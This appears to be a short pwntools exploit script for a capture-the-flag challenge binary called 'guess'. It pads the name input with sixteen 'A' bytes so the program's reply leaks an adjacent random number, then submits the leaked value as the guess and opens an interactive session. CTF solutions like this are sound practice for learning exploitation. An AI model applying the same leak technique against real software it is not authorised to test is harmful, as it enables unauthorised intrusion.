#!/usr/bin/python
# coding: utf-8

from pwn import *

# context.log_level = 'debug'

filename = "./guess"
e = ELF(filename)
p = process(e.path)

print p.recvuntil("Tell me your name")
payload = "A" * 0x10
p.send(payload)

print p.recvuntil("Nice to meet you " + payload)
randnum = u32(p.recv(4))
p.recvline()
log.info("leaked random number : %d" % randnum)

print p.recvuntil("Okay, can you guess the random number?")
p.sendline(str(randnum))

p.interactive()

